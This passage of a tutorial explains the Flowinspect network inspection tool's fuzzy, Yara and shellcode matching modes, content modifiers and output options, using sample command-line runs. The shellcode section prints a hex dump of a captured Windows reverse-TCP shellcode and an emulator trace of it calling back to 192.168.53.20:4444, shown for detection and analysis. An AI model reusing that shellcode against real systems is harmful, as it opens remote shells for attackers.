+[27-Nov-2014 11:22:59.126942 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:22:59.127170 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 627B (#1), Longest: 627B (#1) }}
+
+[27-Nov-2014 11:22:59.127496 IST] [doexit] NORM: Session completed in 0:00:00.021806. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -G 'HTTp' -V -b32
+[27-Nov-2014 11:23:06.115715 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:23:06.116155 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 [NEW] { TRACKED: 1 }
+[27-Nov-2014 11:23:06.116350 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled CTS data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:23:06.116673 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 [627B] { CTS: 627, STC: 0, TOT: 627 }
+[27-Nov-2014 11:23:06.116848 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on CTS[0:627] - 627B
+[27-Nov-2014 11:23:06.117043 IST] [inspect] INFO: [IP#1.TCP#1] Received 627B for inspection from 172.16.16.128:1606 -> 74.125.95.104:80
+[27-Nov-2014 11:23:06.117043 IST] [inspect] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 matches 'HTTp' (ratio: 75 >= threshold: 75)
+[27-Nov-2014 11:23:06.117043 IST] [showtcpmatches] INFO: [IP#1.TCP#1] BPF: (ip.src == 172.16.16.128 and tcp.srcport == 1606) and (ip.dst == 74.125.95.104 and tcp.dstport == 80)
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 matches 'HTTp' (ratio: 75 >= threshold: 75)
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[0:627] (627B | packet[4] - packet[4])
+00000000:  47 45 54 20 2f 20 48 54 54 50 2f 31 2e 31 0d 0a   |GET / HTTP/1.1..|
+00000010:  48 6f 73 74 3a 20 77 77 77 2e 67 6f 6f 67 6c 65   |Host: www.google|
+
+[27-Nov-2014 11:23:06.121300 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 not being tracked any further { tcpmultimatch: False }
+
+[27-Nov-2014 11:23:06.121704 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:23:06.121863 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 627B (#1), Longest: 627B (#1) }}
+
+[27-Nov-2014 11:23:06.122211 IST] [doexit] NORM: Session completed in 0:00:00.024924. Exiting.
+```
+
+## Yara Inspection Mode
+The third inspection option is Yara rule matching over network streams. Yara is a signature-based malware identification and classification tool. Its yara-python bindings provide an API to use existing/custom signature files on an input buffer which in Flowinspect's usecase is a network stream. Let's have a look at the available options for Yara inspection mode:
+
+```shell
+Yara Rules per Direction:
+  -P --cyararules       Yara rules to match on CTS data
+  -Q --syararules       Yara rules to match on STC data
+  -R --ayararules       Yara rules to match on ANY data
+```
+
+This mode expects a rule file from which rules are parsed, compiled and matched upon respective network streams:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/layer7/http_google.pcap -R ~/toolbox/testfiles/rules/yara/http.yar -V
+[27-Nov-2014 11:55:25.451002 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[27-Nov-2014 11:55:25.452056 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 [NEW] { TRACKED: 1 }
+[27-Nov-2014 11:55:25.452196 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled CTS data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:55:25.452306 IST] [handletcp] INFO: [IP#1.TCP#1] Enabled STC data collection for 172.16.16.128:1606 - 74.125.95.104:80
+[27-Nov-2014 11:55:25.452415 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 [627B] { CTS: 627, STC: 0, TOT: 627 }
+[27-Nov-2014 11:55:25.452472 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on CTS[0:627] - 627B
+[27-Nov-2014 11:55:25.452518 IST] [inspect] INFO: [IP#1.TCP#1] Received 627B for inspection from 172.16.16.128:1606 -> 74.125.95.104:80
+[27-Nov-2014 11:55:25.452630 IST] [inspect] INFO: [IP#1.TCP#1] 172.16.16.128:1606 -> 74.125.95.104:80 doesnot match any rule in /home/shiv/toolbox/testfiles/rules/yara/http.yar
+[27-Nov-2014 11:55:25.452788 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80 [1406B] { CTS: 627, STC: 1406, TOT: 2033 }
+[27-Nov-2014 11:55:25.452852 IST] [handletcp] INFO: [IP#1.TCP#1] Initiating inspection on STC[0:1406] - 1406B
+[27-Nov-2014 11:55:25.452889 IST] [inspect] INFO: [IP#1.TCP#1] Received 1406B for inspection from 172.16.16.128:1606 <- 74.125.95.104:80
+[27-Nov-2014 11:55:25.453111 IST] [showtcpmatches] INFO: [IP#1.TCP#1] BPF: (ip.src == 172.16.16.128 and tcp.srcport == 1606) and (ip.dst == 74.125.95.104 and tcp.dstport == 80)
+[MATCH] (00000002/00000001) [IP#1.TCP#1] 172.16.16.128:1606 <- 74.125.95.104:80 matches rule: 'http' from /home/shiv/toolbox/testfiles/rules/yara/http.yar
+[MATCH] (00000002/00000001) [IP#1.TCP#1] match @ STC[0:15] (15B | packet[6] - packet[6])
+00000000:  48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b      |HTTP/1.1 200 OK|
+
+[27-Nov-2014 11:55:25.453437 IST] [handletcp] INFO: [IP#1.TCP#1] 172.16.16.128:1606 - 74.125.95.104:80 not being tracked any further { tcpmultimatch: False }
+
+[27-Nov-2014 11:55:25.453585 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 11:55:25.453627 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 15B (#1), Longest: 15B (#1) }}
+
+[27-Nov-2014 11:55:25.453712 IST] [doexit] NORM: Session completed in 0:00:00.019872. Exiting.
+```
+
+In the output above, Flowinspect informs that a rule named `http` matched on `172.16.16.128:1606 - 74.125.95.104:80` TCP stream. The content that is matched via this rule is of size 15B and is contained within the STC buffer spanning packet #6.
+
+## Shellcode Inspection Mode
+The fourth and the last inspection mode is shellcode matching. There's a library called [libemu](http://libemu.carnivore.it/) that provides x86 emulation as well as shellcode detection via the GetPC heuristics. Most of Metasploit x86 architecture shellcode can be [detected](http://resources.infosecinstitute.com/shellcode-detection-emulation-libemu/) [via](https://bwall.github.io/libemu-scapy-for-shellcode-on-the-network/) [Libemu](http://nuald.blogspot.in/2010/10/shellcode-detection-using-libemu.html). Flowinspect uses its Python bindings, [pylibemu](https://github.com/buffer/pylibemu) to inspect CTS/STC buffers. Let's have a look at the options provided in this mode:
+
+```shell
+Shellcode Detection:
+  -M                    enable shellcode detection
+  -J                    enable shellcode disassembly
+  -y                    generate emulator profile for detected shellcode
+  -Y --emuprofileoutsize
+                        emulator profile memory size (default 1024K | max:
+                        10240K)
+```
+
+Unlike the other three inspection modes, shellcode detection work explicitly on both CTS and STC buffers at the same time. This means that when you request inspection and Flowinspect will auto inspect both buffers and reports matches. Let's give this mode a test run:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -M
+[27-Nov-2014 12:14:19.750865 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000002/00000001) [IP#1.TCP#1] 55.51.105.73:60246 <- 53.70.78.87:80 contains shellcode [Offset: 104]
+[MATCH] (00000002/00000001) [IP#1.TCP#1] match @ STC[104:278] (174B | packet[6] - packet[6])
+00000000:  e8 f9 ff ff ff 60 31 db 8b 7d 3c 8b 7c 3d 78 01   |.....`1..}<.|=x.|
+00000010:  ef 8b 57 20 01 ea 8b 34 9a 01 ee 31 c0 99 ac c1   |..W ...4...1....|
+00000020:  ca 0d 01 c2 84 c0 75 f6 43 66 39 ca 75 e3 4b 8b   |......u.Cf9.u.K.|
+00000030:  4f 24 01 e9 66 8b 1c 59 8b 4f 1c 01 e9 03 2c 99   |O$..f..Y.O....,.|
+00000040:  89 6c 24 1c 61 ff e0 31 db 64 8b 43 30 8b 40 0c   |.l$.a..1.d.C0.@.|
+00000050:  8b 70 1c ad 8b 68 08 5e 66 53 66 68 33 32 68 77   |.p...h.^fSfh32hw|
+00000060:  73 32 5f 54 66 b9 72 60 ff d6 95 53 53 53 53 43   |s2_Tf.r`...SSSSC|
+00000070:  53 43 53 89 e7 66 81 ef 08 02 57 53 66 b9 e7 df   |SCS..f....WSf...|
+00000080:  ff d6 66 b9 a8 6f ff d6 97 68 c0 a8 35 14 66 68   |..f..o...h..5.fh|
+00000090:  11 5c 66 53 89 e3 6a 10 53 57 66 b9 57 05 ff d6   |..fS..j.SWf.W...|
+000000a0:  50 b4 0c 50 53 57 53 66 b9 c0 38 ff e6 0a         |P..PSWSf..8...|
+
+[27-Nov-2014 12:14:19.771376 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 12:14:19.771409 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 174B (#1), Longest: 174B (#1) }}
+
+[27-Nov-2014 12:14:19.771532 IST] [doexit] NORM: Session completed in 0:00:00.032331. Exiting.
+```
+
+So we found a match on the STC buffer of a TCP stream `55.51.105.73:60246 <- 53.70.78.87:80`. The match is of size 172B and spans packet #6. Although, it's great that we can find shellcode in network traffic, we still know nothing about the shellcode itself. It would be awesome if we can also identify the type of shellcode and what damage it can cause when executed on the victim system. This is where Libemu's profiling feature comes in handy. It traces each system call, its arguments and return type which provide significant insight into the shellcode behavior:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -My -b32
+[27-Nov-2014 12:38:18.796721 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000002/00000001) [IP#1.TCP#1] 55.51.105.73:60246 <- 53.70.78.87:80 contains shellcode [Offset: 104]
+[MATCH] (00000002/00000001) [IP#1.TCP#1] match @ STC[104:278] (174B | packet[6] - packet[6])
+00000000:  e8 f9 ff ff ff 60 31 db 8b 7d 3c 8b 7c 3d 78 01   |.....`1..}<.|=x.|
+00000010:  ef 8b 57 20 01 ea 8b 34 9a 01 ee 31 c0 99 ac c1   |..W ...4...1....|
+
+[27-Nov-2014 12:38:18.817598 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 12:38:18.817842 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 174B (#1), Longest: 174B (#1) }}
+
+[27-Nov-2014 12:38:18.818107 IST] [doexit] NORM: Session completed in 0:00:00.037290. Exiting.
+$
+$ ll
+-rw-rw-r-- 1 shiv shiv  903 Dec 30 12:18 TCP-00000001-55.51.105.73.60246-53.70.78.87.80-STC.emuprofile
+```
+
+The `-b` option specifies max number of bytes to show in output modes for matching streams. Since we don't really care about the hexadecimal bytes for now, we requested dumping of first 32B only. Above invocation of Flowinspect will dump the emulator profile to a TCP session based `.emuprofile` file:
+
+```c
+$ cat TCP-00000001-55.51.105.73.60246-53.70.78.87.80-STC.emuprofile
+HMODULE LoadLibraryA (
+     LPCTSTR = 0x010bee90 =>
+           = "ws2_32";
+) =  0x71a10000;
+int WSAStartup (
+     WORD wVersionRequested = 2;
+     LPWSADATA lpWSAData = 1244272;
+) =  0x0;
+SOCKET WSASocket (
+     int af = 2;
+     int type = 1;
+     int protocol = 0;
+     LPWSAPROTOCOL_INFO lpProtocolInfo = 0;
+     GROUP g = 0;
+     DWORD dwFlags = 0;
+) =  0x42;
+int connect (
+     SOCKET s = 66;
+     struct sockaddr_in * name = 0x0012fe88 =>
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 339060928 (host=192.168.53.20);
+             };
+             char sin_zero = "       ";
+         };
+     int namelen = 16;
+) =  0x0;
+int recv (
+     SOCKET s = 66;
+     char * = 0x010bfd70 =>
+         none;
+     int len = 3072;
+     int flags = 0;
+) =  0xc00;
+```
+
+From this profiling output, we can clearly identify and acknowledge the fact that the detected shellcode can do the following:
+
+```c
+1. Load a dynamic library named ws2_32, which is the Windows 32 socket library
+2. Initialize an AF_INET SOCK_STREAM (af:2 and type:0) socket
+3. Attempt connection via this socket to 192.168.53.20:4444
+4. If successful, receive data from 192.168.53.20
+```
+
+This behavior is indicative of the fact that it is a [TCP Reverse Shell](http://morgawr.github.io/hacking/2014/03/29/shellcode-to-reverse-bind-with-netcat/) spawning shellcode. Armed with this knowledge, users can enforce policy actions upon the probable attacker controlled system: `192.168.53.20`
+
+## Content Modifiers
+Flowinspect supports two Snort like content modifiers, [offset](http://manual.snort.org/node32.html#SECTION00458000000000000000) and [depth](http://manual.snort.org/node32.html#SECTION00457000000000000000), invoked via the `-O` and `-D` options respectively. The `offset` modifier instructs Flowinspect to start inspection after skipping specified number of bytes. Similarly, the `depth` modifier instructs Flowinspect to only inspect specified number of bytes starting from the current value of offset. When used in combination these modifiers can prove to be extremely useful:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -b16 -c '.*'
+[27-Nov-2014 13:41:44.463742 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 55.51.105.73:60246 -> 53.70.78.87:80 matches regex: '.*'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[0:124] (124B | packet[4] - packet[4])
+00000000:  47 45 54 20 2f 76 33 44 34 64 38 20 48 54 54 50   |GET /v3D4d8 HTTP|
+
+[27-Nov-2014 13:41:44.464826 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:41:44.465063 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 124B (#1), Longest: 124B (#1) }}
+
+[27-Nov-2014 13:41:44.465354 IST] [doexit] NORM: Session completed in 0:00:00.015481. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -b16 -c '.*' -O4
+[27-Nov-2014 13:41:47.661117 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 55.51.105.73:60246 -> 53.70.78.87:80 matches regex: '.*'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[4:124] (120B | packet[4] - packet[4])
+00000000:  2f 76 33 44 34 64 38 20 48 54 54 50 2f 31 2e 31   |/v3D4d8 HTTP/1.1|
+
+[27-Nov-2014 13:41:47.664129 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:41:47.664353 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 120B (#1), Longest: 120B (#1) }}
+
+[27-Nov-2014 13:41:47.664670 IST] [doexit] NORM: Session completed in 0:00:00.016728. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -b16 -c '.*' -D7
+[27-Nov-2014 13:41:55.357421 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 55.51.105.73:60246 -> 53.70.78.87:80 matches regex: '.*'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[0:7] (7B | packet[4] - packet[4])
+00000000:  47 45 54 20 2f 76 33                              |GET /v3|
+
+[27-Nov-2014 13:41:55.358129 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:41:55.358244 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 7B (#1), Longest: 7B (#1) }}
+
+[27-Nov-2014 13:41:55.358303 IST] [doexit] NORM: Session completed in 0:00:00.011966. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -b16 -c '.*' -O4 -D7
+[27-Nov-2014 13:42:01.359444 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 55.51.105.73:60246 -> 53.70.78.87:80 matches regex: '.*'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[4:11] (7B | packet[4] - packet[4])
+00000000:  2f 76 33 44 34 64 38                              |/v3D4d8|
+
+[27-Nov-2014 13:42:01.361249 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:42:01.362397 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 7B (#1), Longest: 7B (#1) }}
+
+[27-Nov-2014 13:42:01.362984 IST] [doexit] NORM: Session completed in 0:00:00.020027. Exiting.
+```
+
+## Inspection and Display Limits
+Sometimes you might find yourself glancing at thousands of sessions and even with the powerful regex and other inspection mode matches that Flowinspect provides, you might still find it difficult to locate suspicious session. There are cases when you would like to restrict inspection and display to certain number of sessions and that where the following options come in handy:
+
+```shell
+Inspection Limits:
+  -T --maxinspstreams   max streams to inspect
+  -U --maxinsppackets   max packets to inspect
+
+Display Limits:
+  -t --maxdispstreams   max streams to display
+  -u --maxdisppackets   max packets to display
+  -b --maxdispbytes     max bytes to display
+```
+
+So for example, to limit inspection to first 100 TCP sessions, you can use the `-T` option. If you would like to view only the first 10 matches you can use the `-U` option.
+
+## Output and Miscellaneous Options
+Flowinspect allows matching packets/streams to be dumped in the raw format to files via the `-w` option. It might come in handy in case you need to inspect such streams using an external tool and only rely upon Flowinspect's reassembly capabilities.
+
+There are certain output dumping modes that later the way matching streams are dumped to `stdout`:
+
+```shell
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -c '.*' -o meta
+[27-Nov-2014 13:58:40.804023 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 55.51.105.73:60246 -> 53.70.78.87:80 matches regex: '.*'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[0:124] (124B | packet[4] - packet[4])
+
+[27-Nov-2014 13:58:40.804757 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:58:40.804969 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 124B (#1), Longest: 124B (#1) }}
+
+[27-Nov-2014 13:58:40.805302 IST] [doexit] NORM: Session completed in 0:00:00.022088. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -c '.*' -o hex
+[27-Nov-2014 13:58:46.997075 IST] [main] NORM: NIDS initialized, waiting for events...
+
+00000000:  47 45 54 20 2f 76 33 44 34 64 38 20 48 54 54 50   |GET /v3D4d8 HTTP|
+00000010:  2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 35 33 2e 37   |/1.1..Host: 53.7|
+00000020:  30 2e 37 38 2e 38 37 0d 0a 41 63 63 65 70 74 2d   |0.78.87..Accept-|
+00000030:  45 6e 63 6f 64 69 6e 67 3a 20 67 7a 69 70 2c 63   |Encoding: gzip,c|
+00000040:  6f 6d 70 72 65 73 73 2c 64 65 66 6c 61 74 65 0d   |ompress,deflate.|
+00000050:  0a 4b 65 65 70 2d 41 6c 69 76 65 3a 20 33 30 30   |.Keep-Alive: 300|
+00000060:  0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e 3a 20 6b 65   |..Connection: ke|
+00000070:  65 70 2d 61 6c 69 76 65 0d 0a 0d 0a               |ep-alive....|
+
+[27-Nov-2014 13:58:46.997881 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:58:46.998025 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 124B (#1), Longest: 124B (#1) }}
+
+[27-Nov-2014 13:58:46.998159 IST] [doexit] NORM: Session completed in 0:00:00.022163. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -c '.*' -o print
+[27-Nov-2014 13:58:53.616556 IST] [main] NORM: NIDS initialized, waiting for events...
+
+GET /v3D4d8 HTTP/1.1
+Host: 53.70.78.87
+Accept-Encoding: gzip,compress,deflate
+Keep-Alive: 300
+Connection: keep-alive
+
+[27-Nov-2014 13:58:53.617182 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:58:53.617282 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 124B (#1), Longest: 124B (#1) }}
+
+[27-Nov-2014 13:58:53.617396 IST] [doexit] NORM: Session completed in 0:00:00.014428. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -c '.*' -o raw
+[27-Nov-2014 13:59:01.118321 IST] [main] NORM: NIDS initialized, waiting for events...
+
+GET /v3D4d8 HTTP/1.1
+Host: 53.70.78.87
+Accept-Encoding: gzip,compress,deflate
+Keep-Alive: 300
+Connection: keep-alive
+
+[27-Nov-2014 13:59:01.118964 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:59:01.119049 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 124B (#1), Longest: 124B (#1) }}
+
+[27-Nov-2014 13:59:01.119130 IST] [doexit] NORM: Session completed in 0:00:00.013852. Exiting.
+$
+$ ./flowinspect.py -p ~/toolbox/testfiles/pcaps/shellcode/shellcode-reverse-tcp-4444.pcap -c '.*' -o meta -o print
+[27-Nov-2014 13:59:11.165294 IST] [main] NORM: NIDS initialized, waiting for events...
+
+[MATCH] (00000001/00000001) [IP#1.TCP#1] 55.51.105.73:60246 -> 53.70.78.87:80 matches regex: '.*'
+[MATCH] (00000001/00000001) [IP#1.TCP#1] match @ CTS[0:124] (124B | packet[4] - packet[4])
+GET /v3D4d8 HTTP/1.1
+Host: 53.70.78.87
+Accept-Encoding: gzip,compress,deflate
+Keep-Alive: 300
+Connection: keep-alive
+
+[27-Nov-2014 13:59:11.167529 IST] [dumpmatchstats] NORM: UDP Stats: { Processed: 0, Matched: 0 { Shortest: 0B (#0), Longest: 0B (#0) }}
+[27-Nov-2014 13:59:11.167719 IST] [dumpmatchstats] NORM: TCP Stats: { Processed: 1, Matched: 1 { Shortest: 124B (#1), Longest: 124B (#1) }}
+
+[27-Nov-2014 13:59:11.168003 IST] [doexit] NORM: Session completed in 0:00:00.018121. Exiting.
+```
+
+You are allowed to combine these options together as can be seen in the last invocation in the above output.
+
+Flowinspect also supports [BPF expressions](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter) to filter network traffic. It also allows negation of the match logic, reseting the TCP connection for matching streams and writing post-match packets to a pcap file via the miscellaneous options category:
+
+```shell
+Misc. Options:
+  -f --bpf              BPF expression
+  -v                    invert match
+  -V                    verbose output (max: 3)
+  -e                    highlight CTS/STC matches
+  -k                    kill matching TCP stream
+  -j                    enable TCP multi match mode
+  -q pcappacketct       # of post match packets to write to pcap
+  -L                    enable linemode (disables inspection)
+  -B                    skip banner/version display on startup
+  -S                    skip match summary display at exit
+  -n                    show argument stats
+```
+
+Flowinspect has been under active development for some time now and I am constantly pushing fixes and feature to its [GitHub](https://github.com/7h3rAm/flowinspect) repository. Please feel free to try it and let me know if it seems useful in network inspection scenarios you come across.
